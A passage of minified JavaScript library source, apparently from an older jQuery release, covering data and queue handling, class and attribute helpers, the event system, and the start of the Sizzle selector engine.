                if (b === m) return p = this.triggerHandler("getData" + d, [e[0]]), p === m && h && (p = c.data(h, a), p = Ka(h, a, p)), p === m && e[1] ? this.data(e[0]) : p;
                e[1] = b;
                this.each(function() {
                    var f = c(this);
                    f.triggerHandler("setData" + d, e);
                    c.data(this, a, b);
                    f.triggerHandler("changeData" + d, e)
                })
            }, null, b, 1 < arguments.length, null, !1)
        },
        removeData: function(a) {
            return this.each(function() {
                c.removeData(this, a)
            })
        }
    });
    c.extend({
        _mark: function(a, b) {
            a && (b = (b || "fx") + "mark", c._data(a, b, (c._data(a, b) || 0) + 1))
        },
        _unmark: function(a, b, e) {
            !0 !== a && (e = b, b = a, a = !1);
            if (b) {
                e = e || "fx";
                var d = e + "mark";
                (a = a ? 0 : (c._data(b, d) || 1) - 1) ? c._data(b, d, a): (c.removeData(b, d, !0), Ja(b, e, "mark"))
            }
        },
        queue: function(a, b, e) {
            var d;
            if (a) return b = (b || "fx") + "queue", d = c._data(a, b), e && (!d || c.isArray(e) ? d = c._data(a, b, c.makeArray(e)) : d.push(e)), d || []
        },
        dequeue: function(a, b) {
            b = b || "fx";
            var e = c.queue(a, b),
                d = e.shift(),
                f = {};
            "inprogress" === d && (d = e.shift());
            d && ("fx" === b && e.unshift("inprogress"), c._data(a, b + ".run", f), d.call(a, function() {
                    c.dequeue(a, b)
                },
                f));
            e.length || (c.removeData(a, b + "queue " + b + ".run", !0), Ja(a, b, "queue"))
        }
    });
    c.fn.extend({
        queue: function(a, b) {
            var e = 2;
            "string" != typeof a && (b = a, a = "fx", e--);
            return arguments.length < e ? c.queue(this[0], a) : b === m ? this : this.each(function() {
                var e = c.queue(this, a, b);
                "fx" === a && "inprogress" !== e[0] && c.dequeue(this, a)
            })
        },
        dequeue: function(a) {
            return this.each(function() {
                c.dequeue(this, a)
            })
        },
        delay: function(a, b) {
            a = c.fx ? c.fx.speeds[a] || a : a;
            return this.queue(b || "fx", function(b, c) {
                var f = setTimeout(b, a);
                c.stop = function() {
                    clearTimeout(f)
                }
            })
        },
        clearQueue: function(a) {
            return this.queue(a || "fx", [])
        },
        promise: function(a, b) {
            function e() {
                --k || d.resolveWith(f, [f])
            }
            "string" != typeof a && (b = a, a = m);
            a = a || "fx";
            for (var d = c.Deferred(), f = this, g = f.length, k = 1, h = a + "defer", l = a + "queue", p = a + "mark", y; g--;)
                if (y = c.data(f[g], h, m, !0) || (c.data(f[g], l, m, !0) || c.data(f[g], p, m, !0)) && c.data(f[g], h, c.Callbacks("once memory"), !0)) k++, y.add(e);
            e();
            return d.promise(b)
        }
    });
    var Pa = /[\n\t\r]/g,
        da = /\s+/,
        vb = /\r/g,
        wb = /^(?:button|input)$/i,
        xb = /^(?:button|input|object|select|textarea)$/i,
        yb = /^a(?:rea)?$/i,
        Qa = /^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,
        Ra = c.support.getSetAttribute,
        G, Sa, Ta;
    c.fn.extend({
        attr: function(a, b) {
            return c.access(this, c.attr, a, b, 1 < arguments.length)
        },
        removeAttr: function(a) {
            return this.each(function() {
                c.removeAttr(this, a)
            })
        },
        prop: function(a, b) {
            return c.access(this, c.prop, a, b, 1 < arguments.length)
        },
        removeProp: function(a) {
            a = c.propFix[a] || a;
            return this.each(function() {
                try {
                    this[a] = m, delete this[a]
                } catch (b) {}
            })
        },
        addClass: function(a) {
            var b, e, d, f, g, k, h;
            if (c.isFunction(a)) return this.each(function(b) {
                c(this).addClass(a.call(this, b, this.className))
            });
            if (a && "string" == typeof a)
                for (b = a.split(da), e = 0, d = this.length; e < d; e++)
                    if (f = this[e], 1 === f.nodeType)
                        if (f.className || 1 !== b.length) {
                            g = " " + f.className + " ";
                            k = 0;
                            for (h = b.length; k < h; k++) ~g.indexOf(" " + b[k] + " ") || (g += b[k] + " ");
                            f.className = c.trim(g)
                        } else f.className = a;
            return this
        },
        removeClass: function(a) {
            var b, e, d, f, g, k, h;
            if (c.isFunction(a)) return this.each(function(b) {
                c(this).removeClass(a.call(this,
                    b, this.className))
            });
            if (a && "string" == typeof a || a === m)
                for (b = (a || "").split(da), e = 0, d = this.length; e < d; e++)
                    if (f = this[e], 1 === f.nodeType && f.className)
                        if (a) {
                            g = (" " + f.className + " ").replace(Pa, " ");
                            k = 0;
                            for (h = b.length; k < h; k++) g = g.replace(" " + b[k] + " ", " ");
                            f.className = c.trim(g)
                        } else f.className = "";
            return this
        },
        toggleClass: function(a, b) {
            var e = typeof a,
                d = "boolean" == typeof b;
            return c.isFunction(a) ? this.each(function(e) {
                c(this).toggleClass(a.call(this, e, this.className, b), b)
            }) : this.each(function() {
                if ("string" ===
                    e)
                    for (var f, g = 0, k = c(this), h = b, l = a.split(da); f = l[g++];) h = d ? h : !k.hasClass(f), k[h ? "addClass" : "removeClass"](f);
                else if ("undefined" === e || "boolean" === e) this.className && c._data(this, "__className__", this.className), this.className = this.className || !1 === a ? "" : c._data(this, "__className__") || ""
            })
        },
        hasClass: function(a) {
            a = " " + a + " ";
            for (var b = 0, c = this.length; b < c; b++)
                if (1 === this[b].nodeType && -1 < (" " + this[b].className + " ").replace(Pa, " ").indexOf(a)) return !0;
            return !1
        },
        val: function(a) {
            var b, e, d, f = this[0];
            if (arguments.length) return d =
                c.isFunction(a), this.each(function(e) {
                    var f = c(this),
                        h;
                    1 === this.nodeType && (d ? h = a.call(this, e, f.val()) : h = a, null == h ? h = "" : "number" == typeof h ? h += "" : c.isArray(h) && (h = c.map(h, function(a) {
                        return null == a ? "" : a + ""
                    })), b = c.valHooks[this.type] || c.valHooks[this.nodeName.toLowerCase()], b && "set" in b && b.set(this, h, "value") !== m || (this.value = h))
                });
            if (f) {
                if ((b = c.valHooks[f.type] || c.valHooks[f.nodeName.toLowerCase()]) && "get" in b && (e = b.get(f, "value")) !== m) return e;
                e = f.value;
                return "string" == typeof e ? e.replace(vb, "") : null ==
                    e ? "" : e
            }
        }
    });
    c.extend({
        valHooks: {
            option: {
                get: function(a) {
                    var b = a.attributes.value;
                    return !b || b.specified ? a.value : a.text
                }
            },
            select: {
                get: function(a) {
                    var b, e, d = a.selectedIndex,
                        f = [],
                        g = a.options,
                        k = "select-one" === a.type;
                    if (0 > d) return null;
                    a = k ? d : 0;
                    for (e = k ? d + 1 : g.length; a < e; a++)
                        if (b = g[a], !(!b.selected || (c.support.optDisabled ? b.disabled : null !== b.getAttribute("disabled")) || b.parentNode.disabled && c.nodeName(b.parentNode, "optgroup"))) {
                            b = c(b).val();
                            if (k) return b;
                            f.push(b)
                        }
                    return k && !f.length && g.length ? c(g[d]).val() :
                        f
                },
                set: function(a, b) {
                    var e = c.makeArray(b);
                    c(a).find("option").each(function() {
                        this.selected = 0 <= c.inArray(c(this).val(), e)
                    });
                    e.length || (a.selectedIndex = -1);
                    return e
                }
            }
        },
        attrFn: {
            val: !0,
            css: !0,
            html: !0,
            text: !0,
            data: !0,
            width: !0,
            height: !0,
            offset: !0
        },
        attr: function(a, b, e, d) {
            var f, g, k = a.nodeType;
            if (a && 3 !== k && 8 !== k && 2 !== k) {
                if (d && b in c.attrFn) return c(a)[b](e);
                if ("undefined" == typeof a.getAttribute) return c.prop(a, b, e);
                (d = 1 !== k || !c.isXMLDoc(a)) && (b = b.toLowerCase(), g = c.attrHooks[b] || (Qa.test(b) ? Sa : G));
                if (e !==
                    m) {
                    if (null === e) {
                        c.removeAttr(a, b);
                        return
                    }
                    if (g && "set" in g && d && (f = g.set(a, e, b)) !== m) return f;
                    a.setAttribute(b, "" + e);
                    return e
                }
                if (g && "get" in g && d && null !== (f = g.get(a, b))) return f;
                f = a.getAttribute(b);
                return null === f ? m : f
            }
        },
        removeAttr: function(a, b) {
            var e, d, f, g, k, h = 0;
            if (b && 1 === a.nodeType)
                for (d = b.toLowerCase().split(da), g = d.length; h < g; h++)(f = d[h]) && (e = c.propFix[f] || f, k = Qa.test(f), k || c.attr(a, f, ""), a.removeAttribute(Ra ? f : e), k && e in a && (a[e] = !1))
        },
        attrHooks: {
            type: {
                set: function(a, b) {
                    if (wb.test(a.nodeName) && a.parentNode) c.error("type property can't be changed");
                    else if (!c.support.radioValue && "radio" === b && c.nodeName(a, "input")) {
                        var e = a.value;
                        a.setAttribute("type", b);
                        e && (a.value = e);
                        return b
                    }
                }
            },
            value: {
                get: function(a, b) {
                    return G && c.nodeName(a, "button") ? G.get(a, b) : b in a ? a.value : null
                },
                set: function(a, b, e) {
                    if (G && c.nodeName(a, "button")) return G.set(a, b, e);
                    a.value = b
                }
            }
        },
        propFix: {
            tabindex: "tabIndex",
            readonly: "readOnly",
            "for": "htmlFor",
            "class": "className",
            maxlength: "maxLength",
            cellspacing: "cellSpacing",
            cellpadding: "cellPadding",
            rowspan: "rowSpan",
            colspan: "colSpan",
            usemap: "useMap",
            frameborder: "frameBorder",
            contenteditable: "contentEditable"
        },
        prop: function(a, b, e) {
            var d, f, g;
            g = a.nodeType;
            if (a && 3 !== g && 8 !== g && 2 !== g) return (g = 1 !== g || !c.isXMLDoc(a)) && (b = c.propFix[b] || b, f = c.propHooks[b]), e !== m ? f && "set" in f && (d = f.set(a, e, b)) !== m ? d : a[b] = e : f && "get" in f && null !== (d = f.get(a, b)) ? d : a[b]
        },
        propHooks: {
            tabIndex: {
                get: function(a) {
                    var b = a.getAttributeNode("tabindex");
                    return b && b.specified ? parseInt(b.value, 10) : xb.test(a.nodeName) || yb.test(a.nodeName) && a.href ? 0 : m
                }
            }
        }
    });
    c.attrHooks.tabindex = c.propHooks.tabIndex;
    Sa = {
        get: function(a, b) {
            var e, d = c.prop(a, b);
            return !0 === d || "boolean" != typeof d && (e = a.getAttributeNode(b)) && !1 !== e.nodeValue ? b.toLowerCase() : m
        },
        set: function(a, b, e) {
            var d;
            !1 === b ? c.removeAttr(a, e) : (d = c.propFix[e] || e, d in a && (a[d] = !0), a.setAttribute(e, e.toLowerCase()));
            return e
        }
    };
    Ra || (Ta = {
        name: !0,
        id: !0,
        coords: !0
    }, G = c.valHooks.button = {
        get: function(a, b) {
            var c;
            return (c = a.getAttributeNode(b)) && (Ta[b] ? "" !== c.nodeValue : c.specified) ? c.nodeValue : m
        },
        set: function(a, b, c) {
            var d = a.getAttributeNode(c);
            d || (d = n.createAttribute(c),
                a.setAttributeNode(d));
            return d.nodeValue = b + ""
        }
    }, c.attrHooks.tabindex.set = G.set, c.each(["width", "height"], function(a, b) {
        c.attrHooks[b] = c.extend(c.attrHooks[b], {
            set: function(a, c) {
                if ("" === c) return a.setAttribute(b, "auto"), c
            }
        })
    }), c.attrHooks.contenteditable = {
        get: G.get,
        set: function(a, b, c) {
            "" === b && (b = "false");
            G.set(a, b, c)
        }
    });
    c.support.hrefNormalized || c.each(["href", "src", "width", "height"], function(a, b) {
        c.attrHooks[b] = c.extend(c.attrHooks[b], {
            get: function(a) {
                a = a.getAttribute(b, 2);
                return null === a ? m : a
            }
        })
    });
    c.support.style || (c.attrHooks.style = {
        get: function(a) {
            return a.style.cssText.toLowerCase() || m
        },
        set: function(a, b) {
            return a.style.cssText = "" + b
        }
    });
    c.support.optSelected || (c.propHooks.selected = c.extend(c.propHooks.selected, {
        get: function(a) {
            a = a.parentNode;
            a && (a.selectedIndex, a.parentNode && a.parentNode.selectedIndex);
            return null
        }
    }));
    c.support.enctype || (c.propFix.enctype = "encoding");
    c.support.checkOn || c.each(["radio", "checkbox"], function() {
        c.valHooks[this] = {
            get: function(a) {
                return null === a.getAttribute("value") ?
                    "on" : a.value
            }
        }
    });
    c.each(["radio", "checkbox"], function() {
        c.valHooks[this] = c.extend(c.valHooks[this], {
            set: function(a, b) {
                if (c.isArray(b)) return a.checked = 0 <= c.inArray(c(a).val(), b)
            }
        })
    });
    var oa = /^(?:textarea|input|select)$/i,
        Ua = /^([^\.]*)?(?:\.(.+))?$/,
        zb = /(?:^|\s)hover(\.\S+)?\b/,
        Ab = /^key/,
        Bb = /^(?:mouse|contextmenu)|click/,
        Va = /^(?:focusinfocus|focusoutblur)$/,
        Cb = /^(\w*)(?:#([\w\-]+))?(?:\.([\w\-]+))?$/,
        Db = function(a) {
            (a = Cb.exec(a)) && (a[1] = (a[1] || "").toLowerCase(), a[3] = a[3] && new RegExp("(?:^|\\s)" + a[3] +
                "(?:\\s|$)"));
            return a
        },
        Wa = function(a) {
            return c.event.special.hover ? a : a.replace(zb, "mouseenter$1 mouseleave$1")
        };
    c.event = {
        add: function(a, b, e, d, f) {
            var g, k, h, l, p, y, q, n, r;
            if (3 !== a.nodeType && 8 !== a.nodeType && b && e && (g = c._data(a))) {
                e.handler && (q = e, e = q.handler, f = q.selector);
                e.guid || (e.guid = c.guid++);
                (h = g.events) || (g.events = h = {});
                (k = g.handle) || (g.handle = k = function(a) {
                    return "undefined" == typeof c || a && c.event.triggered === a.type ? m : c.event.dispatch.apply(k.elem, arguments)
                }, k.elem = a);
                b = c.trim(Wa(b)).split(" ");
                for (g = 0; g < b.length; g++) l = Ua.exec(b[g]) || [], p = l[1], y = (l[2] || "").split(".").sort(), r = c.event.special[p] || {}, p = (f ? r.delegateType : r.bindType) || p, r = c.event.special[p] || {}, l = c.extend({
                        type: p,
                        origType: l[1],
                        data: d,
                        handler: e,
                        guid: e.guid,
                        selector: f,
                        quick: f && Db(f),
                        namespace: y.join(".")
                    }, q), n = h[p], n || (n = h[p] = [], n.delegateCount = 0, r.setup && !1 !== r.setup.call(a, d, y, k) || (a.addEventListener ? a.addEventListener(p, k, !1) : a.attachEvent && a.attachEvent("on" + p, k))), r.add && (r.add.call(a, l), l.handler.guid || (l.handler.guid = e.guid)),
                    f ? n.splice(n.delegateCount++, 0, l) : n.push(l), c.event.global[p] = !0;
                a = null
            }
        },
        global: {},
        remove: function(a, b, e, d, f) {
            var g = c.hasData(a) && c._data(a),
                k, h, l, p, m, q, n, r, t, A, u;
            if (g && (n = g.events)) {
                b = c.trim(Wa(b || "")).split(" ");
                for (k = 0; k < b.length; k++)
                    if (h = Ua.exec(b[k]) || [], l = p = h[1], h = h[2], l) {
                        r = c.event.special[l] || {};
                        l = (d ? r.delegateType : r.bindType) || l;
                        A = n[l] || [];
                        m = A.length;
                        h = h ? new RegExp("(^|\\.)" + h.split(".").sort().join("\\.(?:.*\\.)?") + "(\\.|$)") : null;
                        for (q = 0; q < A.length; q++) u = A[q], !f && p !== u.origType || e && e.guid !==
                            u.guid || h && !h.test(u.namespace) || d && d !== u.selector && ("**" !== d || !u.selector) || (A.splice(q--, 1), u.selector && A.delegateCount--, !r.remove || r.remove.call(a, u));
                        0 === A.length && m !== A.length && ((!r.teardown || !1 === r.teardown.call(a, h)) && c.removeEvent(a, l, g.handle), delete n[l])
                    } else
                        for (l in n) c.event.remove(a, l + b[k], e, d, !0);
                c.isEmptyObject(n) && (t = g.handle, t && (t.elem = null), c.removeData(a, ["events", "handle"], !0))
            }
        },
        customEvent: {
            getData: !0,
            setData: !0,
            changeData: !0
        },
        trigger: function(a, b, e, d) {
            if (!e || 3 !== e.nodeType &&
                8 !== e.nodeType) {
                var f = a.type || a,
                    g = [],
                    k, h, l, p, n, q;
                if (!Va.test(f + c.event.triggered) && (0 <= f.indexOf("!") && (f = f.slice(0, -1), k = !0), 0 <= f.indexOf(".") && (g = f.split("."), f = g.shift(), g.sort()), e && !c.event.customEvent[f] || c.event.global[f]))
                    if (a = "object" == typeof a ? a[c.expando] ? a : new c.Event(f, a) : new c.Event(f), a.type = f, a.isTrigger = !0, a.exclusive = k, a.namespace = g.join("."), a.namespace_re = a.namespace ? new RegExp("(^|\\.)" + g.join("\\.(?:.*\\.)?") + "(\\.|$)") : null, k = 0 > f.indexOf(":") ? "on" + f : "", e) {
                        if (a.result = m, a.target ||
                            (a.target = e), b = null != b ? c.makeArray(b) : [], b.unshift(a), p = c.event.special[f] || {}, !p.trigger || !1 !== p.trigger.apply(e, b)) {
                            q = [
                                [e, p.bindType || f]
                            ];
                            if (!d && !p.noBubble && !c.isWindow(e)) {
                                h = p.delegateType || f;
                                g = Va.test(h + f) ? e : e.parentNode;
                                for (l = null; g; g = g.parentNode) q.push([g, h]), l = g;
                                l && l === e.ownerDocument && q.push([l.defaultView || l.parentWindow || t, h])
                            }
                            for (h = 0; h < q.length && !a.isPropagationStopped(); h++) g = q[h][0], a.type = q[h][1], (n = (c._data(g, "events") || {})[a.type] && c._data(g, "handle")) && n.apply(g, b), (n = k && g[k]) &&
                                c.acceptData(g) && !1 === n.apply(g, b) && a.preventDefault();
                            a.type = f;
                            !(d || a.isDefaultPrevented() || p._default && !1 !== p._default.apply(e.ownerDocument, b) || "click" === f && c.nodeName(e, "a")) && c.acceptData(e) && k && e[f] && ("focus" !== f && "blur" !== f || 0 !== a.target.offsetWidth) && !c.isWindow(e) && (l = e[k], l && (e[k] = null), c.event.triggered = f, e[f](), c.event.triggered = m, l && (e[k] = l));
                            return a.result
                        }
                    } else
                        for (h in e = c.cache, e) e[h].events && e[h].events[f] && c.event.trigger(a, b, e[h].handle.elem, !0)
            }
        },
        dispatch: function(a) {
            a = c.event.fix(a ||
                t.event);
            var b = (c._data(this, "events") || {})[a.type] || [],
                e = b.delegateCount,
                d = [].slice.call(arguments, 0),
                f = !a.exclusive && !a.namespace,
                g = c.event.special[a.type] || {},
                k = [],
                h, l, p, n, q, V, r;
            d[0] = a;
            a.delegateTarget = this;
            if (!g.preDispatch || !1 !== g.preDispatch.call(this, a)) {
                if (e && (!a.button || "click" !== a.type))
                    for (p = c(this), p.context = this.ownerDocument || this, l = a.target; l != this; l = l.parentNode || this)
                        if (!0 !== l.disabled) {
                            q = {};
                            V = [];
                            p[0] = l;
                            for (h = 0; h < e; h++) {
                                n = b[h];
                                r = n.selector;
                                if (q[r] === m) {
                                    var B = q,
                                        A = r,
                                        u;
                                    if (n.quick) {
                                        u =
                                            n.quick;
                                        var x = l.attributes || {};
                                        u = (!u[1] || l.nodeName.toLowerCase() === u[1]) && (!u[2] || (x.id || {}).value === u[2]) && (!u[3] || u[3].test((x["class"] || {}).value))
                                    } else u = p.is(r);
                                    B[A] = u
                                }
                                q[r] && V.push(n)
                            }
                            V.length && k.push({
                                elem: l,
                                matches: V
                            })
                        }
                b.length > e && k.push({
                    elem: this,
                    matches: b.slice(e)
                });
                for (h = 0; h < k.length && !a.isPropagationStopped(); h++)
                    for (e = k[h], a.currentTarget = e.elem, b = 0; b < e.matches.length && !a.isImmediatePropagationStopped(); b++)
                        if (n = e.matches[b], f || !a.namespace && !n.namespace || a.namespace_re && a.namespace_re.test(n.namespace)) a.data =
                            n.data, a.handleObj = n, n = ((c.event.special[n.origType] || {}).handle || n.handler).apply(e.elem, d), n !== m && (a.result = n, !1 === n && (a.preventDefault(), a.stopPropagation()));
                g.postDispatch && g.postDispatch.call(this, a);
                return a.result
            }
        },
        props: "attrChange attrName relatedNode srcElement altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
        fixHooks: {},
        keyHooks: {
            props: ["char", "charCode", "key", "keyCode"],
            filter: function(a, b) {
                null == a.which &&
                    (a.which = null != b.charCode ? b.charCode : b.keyCode);
                return a
            }
        },
        mouseHooks: {
            props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
            filter: function(a, b) {
                var c, d, f, g = b.button,
                    k = b.fromElement;
                null == a.pageX && null != b.clientX && (c = a.target.ownerDocument || n, d = c.documentElement, f = c.body, a.pageX = b.clientX + (d && d.scrollLeft || f && f.scrollLeft || 0) - (d && d.clientLeft || f && f.clientLeft || 0), a.pageY = b.clientY + (d && d.scrollTop || f && f.scrollTop || 0) - (d && d.clientTop || f &&
                    f.clientTop || 0));
                !a.relatedTarget && k && (a.relatedTarget = k === a.target ? b.toElement : k);
                !a.which && g !== m && (a.which = g & 1 ? 1 : g & 2 ? 3 : g & 4 ? 2 : 0);
                return a
            }
        },
        fix: function(a) {
            if (a[c.expando]) return a;
            var b, e, d = a,
                f = c.event.fixHooks[a.type] || {},
                g = f.props ? this.props.concat(f.props) : this.props;
            a = c.Event(d);
            for (b = g.length; b;) e = g[--b], a[e] = d[e];
            a.target || (a.target = d.srcElement || n);
            3 === a.target.nodeType && (a.target = a.target.parentNode);
            a.metaKey === m && (a.metaKey = a.ctrlKey);
            return f.filter ? f.filter(a, d) : a
        },
        special: {
            ready: {
                setup: c.bindReady
            },
            load: {
                noBubble: !0
            },
            focus: {
                delegateType: "focusin"
            },
            blur: {
                delegateType: "focusout"
            },
            beforeunload: {
                setup: function(a, b, e) {
                    c.isWindow(this) && (this.onbeforeunload = e)
                },
                teardown: function(a, b) {
                    this.onbeforeunload === b && (this.onbeforeunload = null)
                }
            }
        },
        simulate: function(a, b, e, d) {
            a = c.extend(new c.Event, e, {
                type: a,
                isSimulated: !0,
                originalEvent: {}
            });
            d ? c.event.trigger(a, null, b) : c.event.dispatch.call(b, a);
            a.isDefaultPrevented() && e.preventDefault()
        }
    };
    c.event.handle = c.event.dispatch;
    c.removeEvent = n.removeEventListener ? function(a,
        b, c) {
        a.removeEventListener && a.removeEventListener(b, c, !1)
    } : function(a, b, c) {
        a.detachEvent && a.detachEvent("on" + b, c)
    };
    c.Event = function(a, b) {
        if (!(this instanceof c.Event)) return new c.Event(a, b);
        a && a.type ? (this.originalEvent = a, this.type = a.type, this.isDefaultPrevented = a.defaultPrevented || !1 === a.returnValue || a.getPreventDefault && a.getPreventDefault() ? ca : J) : this.type = a;
        b && c.extend(this, b);
        this.timeStamp = a && a.timeStamp || c.now();
        this[c.expando] = !0
    };
    c.Event.prototype = {
        preventDefault: function() {
            this.isDefaultPrevented =
                ca;
            var a = this.originalEvent;
            !a || (a.preventDefault ? a.preventDefault() : a.returnValue = !1)
        },
        stopPropagation: function() {
            this.isPropagationStopped = ca;
            var a = this.originalEvent;
            !a || (a.stopPropagation && a.stopPropagation(), a.cancelBubble = !0)
        },
        stopImmediatePropagation: function() {
            this.isImmediatePropagationStopped = ca;
            this.stopPropagation()
        },
        isDefaultPrevented: J,
        isPropagationStopped: J,
        isImmediatePropagationStopped: J
    };
    c.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout"
    }, function(a, b) {
        c.event.special[a] = {
            delegateType: b,
            bindType: b,
            handle: function(a) {
                var d = a.relatedTarget,
                    f = a.handleObj,
                    g;
                if (!d || d !== this && !c.contains(this, d)) a.type = f.origType, g = f.handler.apply(this, arguments), a.type = b;
                return g
            }
        }
    });
    c.support.submitBubbles || (c.event.special.submit = {
        setup: function() {
            if (c.nodeName(this, "form")) return !1;
            c.event.add(this, "click._submit keypress._submit", function(a) {
                a = a.target;
                (a = c.nodeName(a, "input") || c.nodeName(a, "button") ? a.form : m) && !a._submit_attached && (c.event.add(a, "submit._submit", function(a) {
                        a._submit_bubble = !0
                    }),
                    a._submit_attached = !0)
            })
        },
        postDispatch: function(a) {
            a._submit_bubble && (delete a._submit_bubble, this.parentNode && !a.isTrigger && c.event.simulate("submit", this.parentNode, a, !0))
        },
        teardown: function() {
            if (c.nodeName(this, "form")) return !1;
            c.event.remove(this, "._submit")
        }
    });
    c.support.changeBubbles || (c.event.special.change = {
        setup: function() {
            if (oa.test(this.nodeName)) {
                if ("checkbox" === this.type || "radio" === this.type) c.event.add(this, "propertychange._change", function(a) {
                    "checked" === a.originalEvent.propertyName &&
                        (this._just_changed = !0)
                }), c.event.add(this, "click._change", function(a) {
                    this._just_changed && !a.isTrigger && (this._just_changed = !1, c.event.simulate("change", this, a, !0))
                });
                return !1
            }
            c.event.add(this, "beforeactivate._change", function(a) {
                a = a.target;
                oa.test(a.nodeName) && !a._change_attached && (c.event.add(a, "change._change", function(a) {
                    this.parentNode && !a.isSimulated && !a.isTrigger && c.event.simulate("change", this.parentNode, a, !0)
                }), a._change_attached = !0)
            })
        },
        handle: function(a) {
            var b = a.target;
            if (this !== b || a.isSimulated ||
                a.isTrigger || "radio" !== b.type && "checkbox" !== b.type) return a.handleObj.handler.apply(this, arguments)
        },
        teardown: function() {
            c.event.remove(this, "._change");
            return oa.test(this.nodeName)
        }
    });
    c.support.focusinBubbles || c.each({
        focus: "focusin",
        blur: "focusout"
    }, function(a, b) {
        var e = 0,
            d = function(a) {
                c.event.simulate(b, a.target, c.event.fix(a), !0)
            };
        c.event.special[b] = {
            setup: function() {
                0 === e++ && n.addEventListener(a, d, !0)
            },
            teardown: function() {
                0 === --e && n.removeEventListener(a, d, !0)
            }
        }
    });
    c.fn.extend({
        on: function(a,
            b, e, d, f) {
            var g, k;
            if ("object" == typeof a) {
                "string" != typeof b && (e = e || b, b = m);
                for (k in a) this.on(k, b, e, a[k], f);
                return this
            }
            null == e && null == d ? (d = b, e = b = m) : null == d && ("string" == typeof b ? (d = e, e = m) : (d = e, e = b, b = m));
            if (!1 === d) d = J;
            else if (!d) return this;
            1 === f && (g = d, d = function(a) {
                c().off(a);
                return g.apply(this, arguments)
            }, d.guid = g.guid || (g.guid = c.guid++));
            return this.each(function() {
                c.event.add(this, a, d, e, b)
            })
        },
        one: function(a, b, c, d) {
            return this.on(a, b, c, d, 1)
        },
        off: function(a, b, e) {
            if (a && a.preventDefault && a.handleObj) {
                var d =
                    a.handleObj;
                c(a.delegateTarget).off(d.namespace ? d.origType + "." + d.namespace : d.origType, d.selector, d.handler);
                return this
            }
            if ("object" == typeof a) {
                for (d in a) this.off(d, b, a[d]);
                return this
            }
            if (!1 === b || "function" == typeof b) e = b, b = m;
            !1 === e && (e = J);
            return this.each(function() {
                c.event.remove(this, a, e, b)
            })
        },
        bind: function(a, b, c) {
            return this.on(a, null, b, c)
        },
        unbind: function(a, b) {
            return this.off(a, null, b)
        },
        live: function(a, b, e) {
            c(this.context).on(a, this.selector, b, e);
            return this
        },
        die: function(a, b) {
            c(this.context).off(a,
                this.selector || "**", b);
            return this
        },
        delegate: function(a, b, c, d) {
            return this.on(b, a, c, d)
        },
        undelegate: function(a, b, c) {
            return 1 == arguments.length ? this.off(a, "**") : this.off(b, a, c)
        },
        trigger: function(a, b) {
            return this.each(function() {
                c.event.trigger(a, b, this)
            })
        },
        triggerHandler: function(a, b) {
            if (this[0]) return c.event.trigger(a, b, this[0], !0)
        },
        toggle: function(a) {
            var b = arguments,
                e = a.guid || c.guid++,
                d = 0,
                f = function(e) {
                    var f = (c._data(this, "lastToggle" + a.guid) || 0) % d;
                    c._data(this, "lastToggle" + a.guid, f + 1);
                    e.preventDefault();
                    return b[f].apply(this, arguments) || !1
                };
            for (f.guid = e; d < b.length;) b[d++].guid = e;
            return this.click(f)
        },
        hover: function(a, b) {
            return this.mouseenter(a).mouseleave(b || a)
        }
    });
    c.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function(a, b) {
        c.fn[b] = function(a, c) {
            null == c && (c = a, a = null);
            return 0 < arguments.length ? this.on(b, null, a, c) : this.trigger(b)
        };
        c.attrFn && (c.attrFn[b] = !0);
        Ab.test(b) && (c.event.fixHooks[b] = c.event.keyHooks);
        Bb.test(b) && (c.event.fixHooks[b] = c.event.mouseHooks)
    });
    (function() {
        function a(a, b, c, e, f, g) {
            f = 0;
            for (var k = e.length; f < k; f++) {
                var h = e[f];
                if (h) {
                    for (var l = !1, h = h[a]; h;) {
                        if (h[d] === c) {
                            l = e[h.sizset];
                            break
                        }
                        if (1 === h.nodeType)
                            if (g || (h[d] = c, h.sizset = f), "string" != typeof b) {
                                if (h === b) {
                                    l = !0;
                                    break
                                }
                            } else if (0 < q.filter(b, [h]).length) {
                            l = h;
                            break
                        }
                        h = h[a]
                    }
                    e[f] = l
                }
            }
        }

        function b(a, b, c, e, f, g) {
            f = 0;
            for (var k = e.length; f < k; f++) {
                var h = e[f];
                if (h) {
                    for (var l = !1, h = h[a]; h;) {
                        if (h[d] === c) {
                            l = e[h.sizset];
                            break
                        }
                        1 === h.nodeType && !g && (h[d] = c, h.sizset = f);
                        if (h.nodeName.toLowerCase() === b) {
                            l = h;
                            break
                        }
                        h = h[a]
                    }
                    e[f] = l
                }
            }
        }
        var e = /((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,
            d = "sizcache" + (Math.random() + "").replace(".", ""),
            f = 0,
            g = Object.prototype.toString,
            k = !1,
            h = !0,
            l = /\\/g,
            p = /\r\n/g,
            y = /\W/;
        [0, 0].sort(function() {
            h = !1;
            return 0
        });
        var q = function(a, b, c, d) {
            c = c || [];
            var f = b = b || n;
            if (1 !== b.nodeType &&
                9 !== b.nodeType) return [];
            if (!a || "string" != typeof a) return c;
            var k, h, l, p, m, t, y = !0,
                u = q.isXML(b),
                w = [],
                v = a;
            do
                if (e.exec(""), k = e.exec(v))
                    if (v = k[3], w.push(k[1]), k[2]) {
                        p = k[3];
                        break
                    }
            while (k);
            if (1 < w.length && B.exec(a))
                if (2 === w.length && r.relative[w[0]]) h = D(w[0] + w[1], b, d);
                else
                    for (h = r.relative[w[0]] ? [b] : q(w.shift(), b); w.length;) a = w.shift(), r.relative[a] && (a += w.shift()), h = D(a, h, d);
            else if (!d && 1 < w.length && 9 === b.nodeType && !u && r.match.ID.test(w[0]) && !r.match.ID.test(w[w.length - 1]) && (m = q.find(w.shift(), b, u), b = m.expr ?
                    q.filter(m.expr, m.set)[0] : m.set[0]), b)
                for (m = d ? {
                        expr: w.pop(),
                        set: x(d)
